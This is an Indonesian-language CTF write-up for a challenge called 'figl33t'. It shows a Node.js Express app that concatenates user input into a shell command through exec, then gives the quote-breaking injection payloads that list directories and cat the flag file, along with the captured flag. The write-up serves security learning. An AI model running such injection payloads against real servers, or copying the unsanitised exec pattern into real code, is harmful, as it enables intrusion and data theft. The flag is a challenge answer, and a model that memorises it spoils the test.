# figl33t
>My friend really likes ascii art. So I created this website for her.
http://103.167.136.89:10056/

1. Buka website dengan alamat yang diberikan
2. Tampilan website akan seperti ini :

![gambar](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/8c8c013c-7d42-4c40-97be-e3e73f5d1d12)

3. Diberikan sebuah code berupa app.js
```js
const express = require('express');
const bodyParser = require('body-parser');
const exec = require('child_process').exec;
const app = express();

app.use(express.static('public'));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(`${__dirname}/public/index.html`);
    }
);

app.post('/figlet', (req, res) => {
    let cmd = 'timeout 1 figlet \'' + req.body.text + '\'';
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            console.log(stderr);
            res.send('Error');
        } else {
            res.send(stdout);
        }
    });
});

app.listen(3000, () => {
    console.log('figl33t listening on port 3000!');
});
```

4. Untuk melakukan bypass, dapat dibaca dari source code. dengan menggunakan tanda ' sebelum ; dan setelah syntax yang ingin digunakan selesai.
5. Kita coba lakukan command injection (dapat dilihat pada source code yaitu kata exec yg menjadi patokan untuk command injection, sedangkan untuk SSTI vulnerability digunakan kata eval)
6. Input syntax '; ls'

![gambar](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/d641829f-d85d-4a94-9505-ee9f5d84fd61)

didapatkan hasil seperti yang di atas.

7. Lalu gunakan syntax ini '; cd .. && ls' untuk melihat ke directory sebelumnya

![gambar](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/044997ad-07d7-4791-b9e8-7c3bbe555e4a)

8. Dapat dilihat pada gambar terdapat file
```console
flag-3eb436c4-1dd2-4e01-b1f9-af7c2af01481.txt
```
9. Lalu gunakan command cat untuk melihat isi file
```
'; cd .. && ls && cat flag-3eb436c4-1dd2-4e01-b1f9-af7c2af01481.txt'
```
10. Maka didapatkan 

![gambar](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/4c592b23-289a-437e-8db6-f6db180e9ca7)

Flag yang didapat :
```console
ForestyHC{w0w_u_can_hack_figl33t_7d7c1b}
```
